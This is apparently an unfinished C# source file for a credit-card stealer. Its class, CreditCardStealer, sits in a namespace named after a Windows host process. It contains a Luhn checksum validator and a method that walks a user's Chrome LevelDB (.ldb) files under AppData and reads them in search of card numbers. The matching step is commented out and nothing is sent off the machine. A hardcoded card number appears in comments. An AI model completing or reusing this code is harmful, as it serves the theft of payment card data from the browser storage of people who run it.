using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConvHost32
{
    struct CreditCard
    {
        public string number;
        public string expDate;
        public string securityNum;
    }
    class CreditCardStealer
    {
        public static bool CheckNumber(string val)
        {
            /* Removes All spaces */
            val = val.Replace(" ", string.Empty);

            char[] digits = val.ToCharArray();

            List<int> evens = new List<int>();
            List<int> odds = new List<int>();
            /* splitting the digits into even and odd arrays (ex. 123456 turns into [1,3,5] and [2,4,6] */
            int i = 0;
            foreach (char digit in digits)
            {
                /* checking if i is even or odd */
                if (i % 2 == 0)
                {
                    /* Add it to the even number array if it is even and then doubling it by 2 */
                    evens.Add(int.Parse(digit.ToString()) * 2);
                } else
                {
                    /* If i is odd, then add the number to the odds list and dont do anything with it (for now) */
                    odds.Add(int.Parse(digit.ToString()));
                }
                i++;
            }
            /* The total of all even numbers */
            int eTotal = 0;
            /* The total of all odd numbers */
            int oTotal = 0;
            /* Summing up the evens and odds */
            foreach (int even in evens)
            {
                if (even.ToString().Length == 2)
                {
                    int _total = 0;
                    foreach (char a in even.ToString())
                    {
                        _total += int.Parse(a.ToString());
                    }
                    eTotal += _total;
                } else
                {
                    eTotal += even;
                }
                
            }
                
            foreach (int odd in odds)
                oTotal += odd;

            int total = eTotal + oTotal;

            /* if the total of the evens and odds summed is divisible by ten, the number is valid */
            if (total % 10 == 0)
                return true;
            /* if the total isnt divisible by ten then return false */
            return false;
        }

        private static string GetFilesPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        }

        public static string GetCCNum()
        {
            /* 4147202418678577 */
            string path = @"C:\Users\Arin\AppData\Local\Google";

            string[] files = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
           // Regex regex = new Regex("4147202418678577");
            if (Directory.Exists(path))
            {
                foreach (var file in files)
                {
                    FileInfo info = new FileInfo(file);
                    string contents = File.ReadAllText(info.FullName);
                   // Match match = regex.Match(contents);
                /*    if (contents.Contains(4147202418678577))
                    {
                      
                        
                        Console.WriteLine(info.Name);
                       // Console.WriteLine(contents[match.Index]);
                    }*/
                }
            }
            /* No Number was found */
            return string.Empty;
        }
    }
}
